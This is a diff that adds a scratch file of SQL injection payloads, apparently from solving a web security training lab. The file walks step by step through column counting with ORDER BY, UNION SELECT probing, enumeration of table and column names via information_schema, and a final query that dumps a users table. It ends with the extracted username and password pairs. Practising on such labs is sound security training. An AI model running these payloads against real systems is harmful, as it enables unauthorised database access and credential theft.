@@ -1,0 +1,50 @@
+
+SELECT * FROM information_schema.tables
+
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+
+' ORDER BY 1--
+' ORDER BY 2--
+
+
+
+' UNION SELECT NULL,NULL--
+
+' UNION SELECT 'a', table_name FROM information_schema.tables--
+' UNION SELECT NULL, table_name FROM information_schema.tables--
+
+
+SELECT table_name FROM information_schema.tables WHERE table_schema='public'
+
+
+' UNION SELECT NULL, table_name FROM information_schema.tables where table_schema='users_gschdb'--
+
+
+' UNION SELECT NULL, column_name FROM information_schema.tables where table_schema='users_gschdb'--
+
+
+' UNION SELECT  column_name, NULL FROM information_schema.tables where table_schema='users_gschdb'--
+
+
+' UNION SELECT  column_name, NULL FROM information_schema.columns where table_name='users_gschdb'--
+
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_gschdb'--
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name ='users_gschdb' --
+
+
+username_dvaxoj
+password_qnnwnl
+
+' UNION SELECT  username_dvaxoj, password_qnnwnl FROM  users_gschdb--
+
+
+wiener
+myzgleg1l4wax0st56l8
+administrator
+7zeu0ncvk5wp66kuheyn
+carlos
+88fm7um5yb8ld4qvsadg
+
+
